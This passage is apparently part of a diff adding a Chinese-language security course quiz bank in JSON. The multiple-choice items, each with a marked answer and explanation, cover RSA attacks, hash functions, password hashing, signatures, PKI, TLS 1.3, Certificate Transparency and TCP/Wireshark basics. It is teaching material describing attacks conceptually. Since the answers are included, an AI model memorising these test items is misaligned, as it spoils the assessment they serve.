+      "explanation": "当 e=3 且同一消息发给 3 个不同接收者（不同的 n），得到 c₁=m³ mod n₁, c₂=m³ mod n₂, c₃=m³ mod n₃。用中国剩余定理可以计算 m³ mod (n₁n₂n₃)，由于 m³ < n₁n₂n₃，直接开三次方得到 m。防御：使用 OAEP 填充使每次加密不同。"
+    },
+    {
+      "question": "Wiener 攻击针对 RSA 的什么弱点？其核心数学工具是什么？",
+      "options": [
+        "小 e；使用格基约化",
+        "小 d（d < n^(1/4)/3）；使用连分数展开 e/n 恢复 d",
+        "共享模数；使用扩展欧几里得",
+        "弱随机数；使用统计测试"
+      ],
+      "answer": 1,
+      "explanation": "当私钥 d 太小时（d < n^(1/4)/3），e/n 的连分数展开的收敛子（convergents）中包含 k/d。Wiener 攻击遍历这些收敛子，检测哪个是有效的 d。有些开发者为了让解密更快而选择小 d，这正好落入 Wiener 攻击的陷阱。"
+    },
+    {
+      "question": "Fermat 分解法在什么条件下能高效分解 RSA 模数 n？",
+      "options": [
+        "当 n 是偶数时",
+        "当 p 和 q 太接近时（|p-q| 很小），因为 n ≈ a² 且 a = (p+q)/2",
+        "当 e 很小时",
+        "当 d 很大时"
+      ],
+      "answer": 1,
+      "explanation": "Fermat 分解基于 n = a² - b² = (a+b)(a-b)。当 p 和 q 接近时，a = (p+q)/2 接近 √n，从 √n 向上搜索 a，很快就能找到使 a²-n 为完全平方数的 a。防御：生成 RSA 密钥时确保 p 和 q 的差足够大。"
+    },
+    {
+      "question": "面对一道 RSA CTF 题目，首先应该做什么？",
+      "options": [
+        "直接编写 Wiener 攻击代码",
+        "先分析已知参数（n, e, c），检查 n 是否可以被 factordb.com 分解",
+        "尝试所有攻击方法",
+        "检查填充方式"
+      ],
+      "answer": 1,
+      "explanation": "CTF 中的 RSA 攻击决策树第一步永远是检查 n 是否可以被分解。factordb.com 收录了大量已知分解的大整数，很多 CTF 题目的 n 直接可以在上面查到。如果能分解 n，直接计算 d 即可解密，无需任何高级攻击。"
+    },
+    {
+      "question": "Coppersmith 短填充攻击适用于什么场景？其核心数学工具是什么？",
+      "options": [
+        "大 d；使用连分数",
+        "大部分明文已知（如已知消息格式的填充）；使用格基约化（LLL 算法）",
+        "小 e 且单一接收者；使用中国剩余定理",
+        "共享模数；使用扩展欧几里得"
+      ],
+      "answer": 1,
+      "explanation": "当明文的大部分已知时（例如知道填充格式但不知道短消息部分），Coppersmith 方法利用格基约化（LLL 算法）找到多项式的小根，从而恢复未知的明文部分。这在 CTF 中常用于已知消息前缀或后缀的场景。推荐使用 SageMath 的 small_roots() 方法。"
+    }
+  ],
+  "crypto-04": [
+    {
+      "question": "2004 年王小云教授在 CRYPTO 大会上的突破是什么？",
+      "options": [
+        "发明了 SHA-3 算法",
+        "找到了 MD5 的实际碰撞——两个不同输入产生相同的 MD5 哈希值",
+        "破解了 AES 加密",
+        "发明了量子哈希函数"
+      ],
+      "answer": 1,
+      "explanation": "王小云教授使用'消息修改技术'，在普通 PC 上几秒内就能找到 MD5 碰撞。她的攻击不仅针对 MD5，还同时击破了 MD4、HAVAL-128、RIPEMD-128。2005 年她又展示了 SHA-1 的理论弱点，最终促成 Google 在 2017 年完成 SHA-1 的实际碰撞。"
+    },
+    {
+      "question": "密码学哈希函数必须具备的三个安全性质是什么？",
+      "options": [
+        "加密、解密、签名",
+        "抗原像（单向性）、抗第二原像、抗碰撞",
+        "速度快、密钥短、输出短",
+        "可逆性、确定性、唯一性"
+      ],
+      "answer": 1,
+      "explanation": "三个核心性质：1) 抗原像——给定哈希值 h，找不到任何 m 使 hash(m)=h（单向性）；2) 抗第二原像——给定 m₁，找不到 m₂≠m₁ 使 hash(m₁)=hash(m₂)；3) 抗碰撞——找不到任何一对 m₁≠m₂ 使哈希值相同。这三个性质依次增强。"
+    },
+    {
+      "question": "为什么 128 位的 MD5 碰撞攻击复杂度是 2^64 而不是 2^128？",
+      "options": [
+        "因为 MD5 有一半的位是冗余的",
+        "因为生日悖论——在 2^(n/2) 次尝试中高概率找到一对碰撞",
+        "因为王小云找到了捷径",
+        "因为 MD5 的实现有 bug"
+      ],
+      "answer": 1,
+      "explanation": "生日悖论指出：在 23 个人中就有 50% 概率找到两人生日相同（而非需要 365 人）。类似地，对于 n 位哈希值，约 2^(n/2) 次随机尝试就有高概率找到碰撞。MD5 的 128 位输出意味着碰撞安全级别仅为 64 位，远低于直觉预期的 128 位。"
+    },
+    {
+      "question": "SHA-3（Keccak）与 SHA-2 的核心区别是什么？",
+      "options": [
+        "SHA-3 更安全",
+        "SHA-3 更快",
+        "SHA-3 采用完全不同的海绵结构（Sponge），而 SHA-2 使用 Merkle-Damgard 结构",
+        "SHA-3 输出更短"
+      ],
+      "answer": 2,
+      "explanation": "SHA-3 的革命性在于彻底放弃了 Merkle-Damgard 结构（MD5/SHA-1/SHA-2 共享），采用海绵结构（Sponge Construction）。这意味着如果某天 SHA-2 被发现漏洞，SHA-3 因为完全不同的内部设计很可能不受影响。SHA-3 并不比 SHA-2 '更安全'或'更快'，它的价值在于作为战略备份。"
+    },
+    {
+      "question": "Merkle-Damgard 结构（MD5、SHA-1、SHA-2 共享）面临什么特有的攻击？",
+      "options": [
+        "暴力破解",
+        "长度扩展攻击（Length Extension Attack）",
+        "中间人攻击",
+        "重放攻击"
+      ],
+      "answer": 1,
+      "explanation": "Merkle-Damgard 结构的特性使得攻击者知道 hash(m) 后，无需知道 m，就能计算 hash(m || padding || m')——在原始消息后追加数据并得到有效的哈希值。这在使用 H(key || message) 做认证时极其危险。SHA-3 的海绵结构天然免疫此攻击，或者使用 HMAC 代替简单拼接。"
+    },
+    {
+      "question": "Google 的 SHAttered 攻击（2017）证明了什么？",
+      "options": [
+        "SHA-256 被破解",
+        "SHA-1 的第一个实际碰撞——两个不同 PDF 产生相同 SHA-1 哈希值",
+        "MD5 比 SHA-1 更安全",
+        "所有哈希函数都不安全"
+      ],
+      "answer": 1,
+      "explanation": "2017 年 Google 完成了第一个 SHA-1 实际碰撞（SHAttered），制造了两个内容完全不同但 SHA-1 哈希值相同的 PDF 文件。这证实了王小云 2005 年的理论分析。此后所有主流浏览器停止信任 SHA-1 签名的证书，SHA-1 正式退出历史舞台。"
+    }
+  ],
+  "crypto-04-02": [
+    {
+      "question": "为什么直接用 SHA-256 哈希密码（不加盐）是不安全的？",
+      "options": [
+        "因为 SHA-256 已被破解",
+        "因为攻击者可以使用预计算的彩虹表瞬间反查原始密码",
+        "因为 SHA-256 太慢",
+        "因为密码太短无法哈希"
+      ],
+      "answer": 1,
+      "explanation": "彩虹表是预先计算的'明文→哈希'映射数据库。如果密码存储只用了简单的 SHA-256，常见密码（如 '123456'、'password'）的哈希值早已收录在彩虹表中。攻击者获得哈希数据库后，只需查表即可瞬间恢复大部分用户的密码。2012 年 LinkedIn 泄露事件就是典型案例。"
+    },
+    {
+      "question": "bcrypt 比 SHA-256 更适合密码存储的核心原因是什么？",
+      "options": [
+        "bcrypt 输出的哈希更长",
+        "bcrypt 故意设计得很慢（可调工作因子），且内存访问密集，有效抵抗 GPU 并行暴力破解",
+        "bcrypt 使用了更复杂的数学",
+        "bcrypt 是加密算法不是哈希"
+      ],
+      "answer": 1,
+      "explanation": "bcrypt 使用 Eksblowfish 密钥编排，每次哈希需要大量内存访问（抗 GPU/ASIC 并行），且工作因子（cost factor）可调——随着硬件进步可以增大计算成本。SHA-256 设计目标是快速，在现代 GPU 上每秒可计算数十亿次，不适合密码存储。"
+    },
+    {
+      "question": "HMAC 如何同时保证消息的完整性和来源认证？",
+      "options": [
+        "通过对消息加密",
+        "通过共享密钥参与哈希计算——只有持有密钥的人能生成和验证有效 HMAC",
+        "通过数字签名",
+        "通过对消息压缩"
+      ],
+      "answer": 1,
+      "explanation": "HMAC = H((K⊕opad) || H((K⊕ipad) || m))。发送方和接收方共享密钥 K。发送方计算 HMAC 附加到消息上；接收方用相同密钥重新计算 HMAC 并比对。攻击者不知道密钥，篡改消息后无法生成有效的 HMAC。这同时验证了完整性（消息未被篡改）和来源（只有密钥持有者能生成有效 HMAC）。"
+    },
+    {
+      "question": "Merkle 树在区块链中的核心作用是什么？",
+      "options": [
+        "加密交易数据",
+        "将所有交易哈希汇聚成根哈希写入区块头，轻客户端只需 Merkle Proof 即可验证交易",
+        "生成新区块",
+        "验证用户身份"
+      ],
+      "answer": 1,
+      "explanation": "比特币每个区块包含数千笔交易。Merkle 树将所有交易哈希两两配对、层层向上汇聚成唯一的根哈希（Root Hash），写入区块头。轻客户端（SPV 节点）只需下载区块头和约 1KB 的 Merkle Proof，就能验证某笔交易是否被包含，无需下载完整区块。"
+    },
+    {
+      "question": "Argon2 作为现代密码哈希算法的核心优势是什么？",
+      "options": [
+        "输出最长",
+        "速度最快",
+        "内存硬（Memory-hard）——计算时需要占用大量内存，使 ASIC/GPU 攻击成本极高",
+        "密钥最短"
+      ],
+      "answer": 2,
+      "explanation": "Argon2 赢得 2015 年密码哈希竞赛，核心优势是'内存硬'特性。计算时需要分配大量内存（如 64MB），使得并行攻击的硬件成本极高——每个并行单元都需要独立的大内存。这比仅'计算慢'的 bcrypt 更有效地抵抗了专用硬件攻击。"
+    },
+    {
+      "question": "HKDF（HMAC-based Key Derivation Function）的两个阶段分别是什么？",
+      "options": [
+        "加密和解密",
+        "提取（Extract）和扩展（Expand）——从密钥材料中安全派生多个高质量密钥",
+        "签名和验证",
+        "压缩和解压"
+      ],
+      "answer": 1,
+      "explanation": "HKDF 分两阶段：1) Extract——用盐和 HKDF-Extract 将低熵输入浓缩为固定长度的伪随机密钥（PRK）；2) Expand——用 HKDF-Expand 从 PRK 派生任意长度和数量的密钥材料。TLS 1.3 用它从 DH 共享秘密派生所有会话密钥。"
+    }
+  ],
+  "crypto-05": [
+    {
+      "question": "数字签名提供的三个安全保证是什么？",
+      "options": [
+        "加密、解密、哈希",
+        "认证性（证明身份）、完整性（检测篡改）、不可否认性（不能抵赖）",
+        "速度、安全、兼容",
+        "机密性、可用性、完整性"
+      ],
+      "answer": 1,
+      "explanation": "数字签名的三重保证：1) 认证性——只有私钥持有者能生成有效签名；2) 完整性——签名绑定消息哈希，任何篡改都会导致验证失败；3) 不可否认性——签名者不能否认自己签过的消息（因为只有他有私钥）。注意：签名不提供机密性——消息本身可以是公开的。"
+    },
+    {
+      "question": "RSA 签名和 RSA 加密的区别是什么？",
+      "options": [
+        "没有区别",
+        "加密是'公钥加密、私钥解密'；签名是'私钥签名、公钥验证'",
+        "签名比加密更安全",
+        "加密比签名更快"
+      ],
+      "answer": 1,
+      "explanation": "RSA 加密：发送方用接收方的公钥加密，接收方用自己的私钥解密（保护机密性）。RSA 签名：签名方用自己的私钥对消息哈希签名，验证方用签名方的公钥验证（证明身份和完整性）。操作方向相反，安全目标也不同。"
+    },
+    {
+      "question": "ECDSA 相比 RSA 签名的主要优势是什么？",
+      "options": [
+        "ECDSA 更安全",
+        "ECDSA 用更短的密钥达到同等安全级别（256位 ECDSA ≈ 3072位 RSA），签名更小、速度更快",
+        "ECDSA 不需要哈希函数",
+        "ECDSA 可以加密数据"
+      ],
+      "answer": 1,
+      "explanation": "椭圆曲线密码学的优势在于：256 位的 ECDSA（P-256 曲线）提供 128 位安全级别，而 RSA 需要 3072 位才能达到同等安全。更短的密钥意味着更小的签名、更快的计算、更低的存储和带宽开销。这使 ECDSA 在移动设备和 IoT 场景中特别有优势。"
+    },
+    {
+      "question": "X.509 证书在 PKI 体系中的核心作用是什么？",
+      "options": [
+        "加密数据传输",
+        "将公钥与身份绑定，由可信的 CA 签名背书，解决'这个公钥属于谁'的问题",
+        "存储密码",
+        "验证文件完整性"
+      ],
+      "answer": 1,
+      "explanation": "数字签名只能证明'这条消息由某个私钥签名'，但无法证明'这个公钥属于声称的那个人'。攻击者可以替换公钥实施中间人攻击。X.509 证书由受信任的 CA 签发，将域名/身份与公钥绑定。浏览器通过验证证书链来确认服务器身份。"
+    },
+    {
+      "question": "Let's Encrypt 使用什么协议实现自动化证书签发？",
+      "options": [
+        "SSL/TLS",
+        "ACME（Automatic Certificate Management Environment）协议",
+        "HTTP/2",
+        "SMTP"
+      ],
+      "answer": 1,
+      "explanation": "ACME 协议自动完成证书签发的全流程：1) 客户端生成密钥对；2) 向 CA 申请证书；3) CA 发出挑战（如 HTTP-01：在特定 URL 放置特定内容）；4) 客户端完成挑战证明域名控制权；5) CA 签发证书。全程自动化，证书有效期 90 天，自动续期。"
+    },
+    {
+      "question": "2011 年 DigiNotar 事件暴露了 PKI 体系的什么根本弱点？",
+      "options": [
+        "加密算法太弱",
+        "CA 本身可能被入侵，攻击者利用 CA 权限为任意域名签发伪造证书",
+        "证书格式有漏洞",
+        "浏览器不支持证书验证"
+      ],
+      "answer": 1,
+      "explanation": "DigiNotar 被黑客入侵后，攻击者利用其 CA 权限为 google.com 等域名伪造了 247 个证书。因为浏览器预装了 DigiNotar 的根证书，这些伪造证书被自动信任。事件暴露了 PKI 的根本问题：预装的约 150 个根 CA 中任何一个被攻破，整个信任链就崩塌。这推动了证书透明（CT）的发展。"
+    }
+  ],
+  "crypto-06": [
+    {
+      "question": "TLS 1.3 相比 TLS 1.2 最重要的设计变化是什么？",
+      "options": [
+        "增加了更多加密算法选项",
+        "做减法——删除所有不安全的算法和特性，只保留最优选择，强制前向保密",
+        "增加了握手往返次数以提高安全性",
+        "改用了对称加密"
+      ],
+      "answer": 1,
+      "explanation": "TLS 1.3 是一次彻底的'减法革命'：移除了 RSA 密钥交换（无前向保密）、CBC 模式、RC4、3DES、MD5、SHA-1、重协商、压缩等所有有安全隐患的组件。只保留 AEAD 加密（AES-GCM, ChaCha20-Poly1305）和临时密钥交换（ECDHE/DHE），强制前向保密。"
+    },
+    {
+      "question": "TLS 1.3 握手只需 1-RTT（一个往返），而 TLS 1.2 需要 2-RTT。关键改进是什么？",
+      "options": [
+        "减少了证书验证步骤",
+        "客户端在 ClientHello 中就发送了 ECDHE 公钥（key_share），服务器可在第一个响应中完成密钥协商",
+        "去掉了加密步骤",
+        "使用了更快的哈希函数"
+      ],
+      "answer": 1,
+      "explanation": "TLS 1.2 中客户端先发送支持的算法列表，服务器选择后再进行密钥交换（需要额外一轮）。TLS 1.3 让客户端在第一个包中就猜测服务器可能接受的密钥交换参数并发送 key_share，服务器选择一个即可立即计算共享密钥。这使得握手延迟减半。"
+    },
+    {
+      "question": "前向保密（Forward Secrecy）保护的是什么？",
+      "options": [
+        "防止中间人攻击",
+        "保护历史通信——即使服务器长期私钥将来泄露，过去的加密流量仍然无法被解密",
+        "加速握手过程",
+        "防止重放攻击"
+      ],
+      "answer": 1,
+      "explanation": "前向保密通过每次连接使用临时密钥对（ECDHE/DHE）实现。连接结束后临时密钥被销毁。即使攻击者录制了所有流量，后来获得了服务器长期私钥，也只能验证身份（签名），无法计算每次连接的临时共享密钥，因此无法解密历史流量。NSA 大规模收集加密流量正是前向保密要防御的场景。"
+    },
+    {
+      "question": "TLS 1.3 的 0-RTT 恢复有什么安全风险？",
+      "options": [
+        "速度太慢",
+        "0-RTT 数据没有前向保密性，且可能被重放攻击",
+        "不支持加密",
+        "需要额外证书"
+      ],
+      "answer": 1,
+      "explanation": "0-RTT 允许客户端在第一个包中发送应用数据（使用预共享密钥加密），但：1) 没有前向保密——如果 PSK 泄露，早期数据可被解密；2) 重放攻击——攻击者可以截获并重发 0-RTT 数据。因此 0-RTT 只应用于幂等操作（如 GET 请求），不应用于非幂等操作（如转账）。"
+    },
+    {
+      "question": "2014 年的 Heartbleed 漏洞影响的是什么？",
+      "options": [
+        "TLS 协议设计本身",
+        "OpenSSL 的心跳扩展实现——缓冲区读取越界导致服务器内存泄露（可能包含私钥）",
+        "RSA 算法有缺陷",
+        "AES 加密被破解"
+      ],
+      "answer": 1,
+      "explanation": "Heartbleed 不是协议设计问题，而是 OpenSSL 代码实现中的 bug。心跳扩展允许发送一个数据包并请求回复，OpenSSL 没有验证长度字段就复制了指定长度的内存。攻击者可以请求 64KB 的内存块，其中可能包含服务器私钥、用户密码、会话数据等敏感信息。这影响了全球约 17% 的 HTTPS 服务器。"
+    },
+    {
+      "question": "TLS 1.3 中密钥推导使用的 HKDF 层次化结构有什么安全优势？",
+      "options": [
+        "计算更快",
+        "每个阶段使用独立密钥——握手密钥泄露不影响应用密钥，前向密钥泄露不影响后续密钥",
+        "减少密钥长度",
+        "简化实现"
+      ],
+      "answer": 1,
+      "explanation": "TLS 1.3 的密钥推导通过 HKDF 层次化进行：Early Secret → Handshake Secret → Master Secret，每个阶段派生出独立的流量密钥。这种设计的优势是密钥隔离——即使某一阶段的密钥泄露，其他阶段的密钥仍然安全。每次密钥更新后，旧密钥可以被安全销毁。"
+    }
+  ],
+  "crypto-06-02": [
+    {
+      "question": "证书透明（Certificate Transparency）的核心思想是什么？",
+      "options": [
+        "加密所有证书",
+        "要求所有签发的证书记录在公开的、仅追加的 Merkle 树日志中，使任何可疑证书可被检测和审计",
+        "减少 CA 数量",
+        "用区块链替代 CA"
+      ],
+      "answer": 1,
+      "explanation": "CT 的核心是让 CA 的行为透明化：每个签发的证书必须提交到公开的 CT 日志（基于 Merkle 树的仅追加数据结构），日志返回 SCT（签名证书时间戳）作为收录证明。域名所有者和公众可以监控日志，发现未经授权的证书。Chrome 从 2018 年起强制要求所有新证书有 SCT。"
+    },
+    {
+      "question": "HPKP（HTTP Public Key Pinning）被所有浏览器弃用的根本原因是什么？",
+      "options": [
+        "安全强度不够",
+        "操作风险太高——如果丢失备份密钥，所有缓存了 pin 的用户将永远无法访问网站（自锁问题）",
+        "实现太复杂",
+        "性能太差"
+      ],
+      "answer": 1,
+      "explanation": "HPKP 允许网站声明'只接受特定公钥的证书'。但如果网站丢失了所有 pin 的密钥且 pin 还没过期（max-age 内），所有已缓存 pin 的浏览器将永远拒绝连接——这就是'自锁'问题。此外，攻击者还可以恶意设置 pin 来锁定网站。由于运维风险远大于安全收益，Chrome 在 2018 年移除了 HPKP。"
+    },
+    {
+      "question": "CAA（Certificate Authority Authorization）DNS 记录的作用是什么？",
+      "options": [
+        "加密 DNS 查询",
+        "让域名所有者声明哪些 CA 被授权为其域名签发证书，减少不诚实 CA 签发伪造证书的风险",
+        "存储 SSL 证书",
+        "加速证书验证"
+      ],
+      "answer": 1,
+      "explanation": "CAA 让域名所有者在 DNS 中声明授权策略，如 '只有 Let's Encrypt 和 DigiCert 可以为 example.com 签发证书'。CA 在签发证书前必须查询 CAA 记录，如果不在授权列表中则拒绝签发。这是减少 CA 信任面的一种有效机制。"
+    },
+    {
+      "question": "CT 日志使用什么数据结构来确保证书一旦记录就不可被篡改或删除？",
+      "options": [
+        "哈希链表",
+        "仅追加的 Merkle 树（Append-only Merkle Tree）——任何修改都会改变根哈希，可被审计器检测",
+        "B+ 树",
+        "布隆过滤器"
+      ],
+      "answer": 1,
+      "explanation": "CT 日志是仅追加的 Merkle 树：每个新证书作为叶子节点加入，内部节点是子节点的哈希。日志服务器签名承诺根哈希。审计器可以验证：1) 任何已承诺的证书确实在树中（包含证明）；2) 树的历史没有被修改（一致性证明）。任何篡改都会导致 Merkle 证明失败。"
+    },
+    {
+      "question": "2017 年 Symantec（赛门铁克）被 Chrome 不信任的原因是什么？",
+      "options": [
+        "Symantec 的加密算法被破解",
+        "Symantec 在数年间签发了超过 30,000 个不合规证书，包括未经域名授权签发和将权限外包给不明第三方",
+        "Symantec 收费太高",
+        "Symantec 不支持 TLS 1.3"
+      ],
+      "answer": 1,
+      "explanation": "Google 调查发现 Symantec 存在系统性违规：未经授权签发证书、将签发权限外包给不知名第三方、签发不属于 Symantec 的测试域名证书等。Google 最终宣布 Chrome 逐步不信任所有 Symantec 证书。Symantec 的 CA 业务以约 10 亿美元卖给了 DigiCert。这是 CA 治理的标志性事件。"
+    },
+    {
+      "question": "Expect-CT 相比 HPKP 的优势是什么？",
+      "options": [
+        "Expect-CT 提供更强的加密",
+        "Expect-CT 不限制特定公钥（无自锁风险），而是要求浏览器验证证书是否记录在 CT 日志中",
+        "Expect-CT 更快",
+        "Expect-CT 不需要 HTTPS"
+      ],
+      "answer": 1,
+      "explanation": "Expect-CT 是 HPKP 的'温和'替代：它不 pin 特定公钥（避免自锁问题），而是告诉浏览器'请检查这个域名的证书是否在 CT 日志中'。如果证书不在 CT 日志中，浏览器可以拒绝连接或发送报告。这既能检测可疑证书，又不会因为密钥丢失导致网站不可访问。可以先用 report-only 模式逐步部署。"
+    }
+  ],
+  "network": [
+    {
+      "question": "在 TCP/IP 四层模型中，当浏览器发起 HTTP 请求时，数据封装的正确顺序是？",
+      "options": [
+        "网络接口层 → 网际层 → 传输层 → 应用层",
+        "应用层 → 传输层 → 网际层 → 网络接口层",
+        "传输层 → 应用层 → 网络接口层 → 网际层",
+        "网际层 → 传输层 → 应用层 → 网络接口层"
+      ],
+      "answer": 1,
+      "explanation": "数据封装从上到下：应用层产生 HTTP 数据 → 传输层添加 TCP 头部（端口、序列号）→ 网际层添加 IP 头部（IP 地址）→ 网络接口层添加 Ethernet 帧头（MAC 地址）。接收方从下到上逐层解封装。"
+    },
+    {
+      "question": "在 IP 头部中，TTL（Time To Live）字段每经过一个路由器会怎样？攻击者如何利用这一点？",
+      "options": [
+        "TTL 加 1，用于追踪路由路径",
+        "TTL 减 1，减到 0 时丢弃；攻击者可通过 TTL 值推断操作系统类型",
+        "TTL 保持不变，只用于加密",
+        "TTL 翻倍，用于负载均衡"
+      ],
+      "answer": 1,
+      "explanation": "TTL 每经过一个路由器减 1，防止数据包无限循环。不同操作系统有默认 TTL 值（Linux=64，Windows=128），攻击者可以通过 ping 响应中的 TTL 推断目标操作系统，为后续针对性攻击做准备。这也是 traceroute 的工作原理。"
+    },
+    {
+      "question": "Ethernet 的默认 MTU 是 1500 字节。TCP 连接的 MSS（最大段大小）通常是多少？",
+      "options": [
+        "1500 字节",
+        "1460 字节",
+        "1480 字节",
+        "1024 字节"
+      ],
+      "answer": 1,
+      "explanation": "MSS = MTU - IP 头部(20字节) - TCP 头部(20字节) = 1500 - 20 - 20 = 1460 字节。MSS 表示每个 TCP 段中应用层数据的最大长度。在 TCP 三次握手时双方会交换 MSS 值。"
+    },
+    {
+      "question": "当数据包经过路由器转发时，以下哪个字段会被替换？",
+      "options": [
+        "源 IP 地址和目标 IP 地址",
+        "源 MAC 地址和目标 MAC 地址",
+        "TCP 序列号和确认号",
+        "HTTP Host 头部"
+      ],
+      "answer": 1,
+      "explanation": "路由器工作在网际层，它会替换数据链路层的 MAC 地址（源 MAC 改为路由器的出口 MAC，目标 MAC 改为下一跳的 MAC），但保持 IP 地址不变。这就是 MAC 只在本地网络有效、而 IP 可以跨网络路由的原因。"
+    },
+    {
+      "question": "在 Wireshark hex dump 中，IP 头部的 Protocol 字段值为 0x06 表示什么？",
+      "options": [
+        "UDP",
+        "ICMP",
+        "TCP",
+        "HTTP"
+      ],
+      "answer": 2,
+      "explanation": "Protocol 字段标识 IP 数据包的上层协议：6=TCP，17=UDP，1=ICMP。HTTP 是应用层协议，不会出现在 IP 头部的 Protocol 字段中。"
+    },
+    {
+      "question": "ARP 欺骗（ARP Spoofing）攻击利用了网络接口层的什么特性？",
+      "options": [
+        "IP 地址可以被伪造",
+        "ARP 协议不验证回复的真实性，攻击者可以发送伪造的 MAC-IP 映射",
+        "MAC 地址可以跨网络路由",
+        "Ethernet 帧头不包含校验和"
+      ],
+      "answer": 1,
+      "explanation": "ARP 协议没有认证机制，局域网中的任何设备都可以发送 ARP 回复。攻击者发送伪造的 ARP 回复，声称自己的 MAC 地址对应目标 IP，从而实施中间人攻击。防御方法包括静态 ARP 绑定和 802.1X 端口安全。"
+    }
+  ],
+  "net-01-02": [
+    {
+      "question": "TCP 三次握手中，第二步服务器 SYN/ACK 包中的 Ack 值等于什么？",
+      "options": [
+        "服务器自己的初始序列号（ISN）",
+        "客户端初始序列号 + 1",
+        "服务器初始序列号 + 1",
+        "0"
+      ],
+      "answer": 1,
+      "explanation": "Ack 值 = 对方 Seq + 1，表示'我已收到你的 SYN（Seq=N），期待你下一个包从 N+1 开始'。这是 TCP 可靠传输和有序传输的基础机制。"
+    },
+    {
+      "question": "SYN Flood 攻击利用了三次握手中服务器的哪个行为？",
+      "options": [
+        "服务器在发送 SYN/ACK 前不检查客户端身份",
+        "服务器在收到 SYN 后就创建半连接并分配资源，但攻击者永远不发 ACK",
+        "三次握手需要太长时间",
+        "客户端的 ISN 总是可预测的"
+      ],
+      "answer": 1,
+      "explanation": "服务器收到 SYN 后会创建半连接数据结构并分配内存。攻击者发送大量 SYN 包（通常伪造源 IP）但不完成握手，半连接队列被填满后，合法用户的 SYN 请求被丢弃，服务拒绝。"
+    },
+    {
+      "question": "SYN Cookie 防御 SYN Flood 的核心思想是什么？",
+      "options": [
+        "丢弃所有 SYN 包",
+        "不立即分配资源，而是将连接信息编码到 ISN 中，仅在收到合法 ACK 后建立连接",
+        "封禁所有发送 SYN 的 IP",
+        "将半连接队列大小增加到无限"
+      ],
+      "answer": 1,
+      "explanation": "SYN Cookie 将源 IP、端口、目标 IP、端口等信息和时间戳的 Hash 编码到 ISN 中。服务器不预先分配资源，只在收到 ACK 后通过重新计算 Hash 验证合法性，验证通过才正式建立连接。"
+    },
+    {
+      "question": "TCP 四次挥手中，主动关闭方进入 TIME_WAIT 状态的主要目的是？",
+      "options": [
+        "等待服务器确认断开",
+        "确保迟到的数据包不被新连接误收，以及确保最后的 ACK 能送达",
+        "让客户端保存数据",
+        "让路由器更新路由表"
+      ],
+      "answer": 1,
+      "explanation": "TIME_WAIT 持续 2*MSL（通常 60 秒），目的有二：1) 确保主动关闭方发送的最后一个 ACK 能到达对方（如果丢失对方会重发 FIN）；2) 让网络中该连接的残留数据包消亡，防止被复用同一端口的新连接误收。"
+    },
+    {
+      "question": "以下哪个 Wireshark 过滤器能检测可能的 SYN 端口扫描？",
+      "options": [
+        "tcp.port == 80",
+        "tcp.flags.syn == 1",
+        "tcp.flags.syn == 1 and tcp.flags.ack == 0",
+        "tcp.flags.reset == 1"
+      ],
+      "answer": 2,
+      "explanation": "纯 SYN 包（SYN=1 且 ACK=0）是连接请求的第一步。端口扫描工具向多个端口发送纯 SYN 包探测。如果同一源 IP 在短时间内向多个不同目标端口发送纯 SYN 包，则很可能是端口扫描。"
+    },
+    {
+      "question": "RST（Reset）包不会在以下哪种场景中被触发？",
+      "options": [
+        "向未监听端口发送 SYN",
+        "正常完成四次挥手关闭连接",
+        "向已关闭的连接发送数据",
+        "半打开连接超时"
+      ],
+      "answer": 1,
+      "explanation": "正常的四次挥手使用 FIN 包优雅关闭，不触发 RST。RST 是暴力断连方式，在向未开放端口发 SYN、向已关闭连接发数据、应用崩溃等异常情况下触发。RST 注入也是攻击者中断合法连接的手段。"
+    }
+  ],
+  "net-02": [
+    {
+      "question": "Wireshark 捕获过滤器和显示过滤器的核心区别是什么？",
+      "options": [
+        "捕获过滤器精度更高",
+        "捕获过滤器在抓包时过滤（不可逆），显示过滤器在显示时过滤（可随时切换）",
+        "捕获过滤器只能按端口过滤",
+        "两者完全相同，只是语法不同"
+      ],
+      "answer": 1,
+      "explanation": "捕获过滤器（BPF 语法）在数据包到达网卡时就过滤，不匹配的包直接丢弃不保存——无法恢复。显示过滤器在已保存的数据上筛选，可随时修改条件，更加灵活。两者语法也完全不同。"
+    },
+    {
+      "question": "要查找所有目标端口 80 的纯 SYN 包（不含 SYN/ACK），最精确的过滤器是？",
+      "options": [
+        "tcp.port == 80",
+        "tcp.flags.syn == 1",
+        "tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.dstport == 80",
+        "http.request"
+      ],
+      "answer": 2,
+      "explanation": "需要三个条件同时满足：SYN=1（是连接请求）、ACK=0（不是响应）、目标端口=80（发往 HTTP 服务）。tcp.port == 80 太宽泛，会匹配源端口或目标端口；http.request 是应用层过滤器。"
+    },
+    {
+      "question": "Wireshark Expert Information 面板中大量 'TCP Retransmission' 警告通常意味着什么？",
+      "options": [
+        "一定存在中间人攻击",
+        "网络质量差，存在丢包或拥塞",
+        "服务器遭受 DDoS",
+        "客户端 TCP 实现有 bug"
+      ],
+      "answer": 1,
+      "explanation": "TCP 重传表示未收到对方 ACK 而重发数据。少量重传正常，大量重传通常表示网络丢包或拥塞。虽然中间人攻击也可能导致重传，但最常见原因还是网络质量问题。"
+    },
+    {
+      "question": "追踪一次完整 HTTP 会话的正确数据包顺序是？",
+      "options": [
+        "HTTP GET → TCP 握手 → DNS 查询 → HTTP 响应",
+        "DNS 查询 → HTTP GET → TCP 握手 → HTTP 响应",
+        "DNS 查询 → TCP 三次握手 → HTTP GET → HTTP 响应",
+        "TCP 握手 → DNS 查询 → HTTP GET → HTTP 响应"
+      ],
+      "answer": 2,
+      "explanation": "正确顺序：1) DNS 查询获取服务器 IP → 2) TCP 三次握手建立连接 → 3) HTTP GET 发送请求 → 4) HTTP 响应返回数据。浏览器必须先知道 IP 才能建立 TCP 连接。"
+    },
+    {
+      "question": "tshark 命令中，'-T fields -e http.request.uri' 参数的作用是？",
+      "options": [
+        "保存 pcap 文件",
+        "按指定字段格式输出（如只输出请求 URI）",
+        "设置捕获过滤器",
+        "显示完整的协议解析"
+      ],
+      "answer": 1,
+      "explanation": "-T fields 指定输出为字段格式（而非默认的包摘要），-e 指定要输出的字段。组合使用可以精确提取特定协议字段的数据，非常适合批量分析和脚本化处理。"
+    },
+    {
+      "question": "Wireshark 的 'Follow TCP Stream' 功能做什么？",
+      "options": [
+        "只显示三次握手包",
+        "将同一 TCP 连接的所有数据按序列号重组并用颜色区分方向显示",
+        "解密 TLS 流量",
+        "统计带宽使用量"
+      ],
+      "answer": 1,
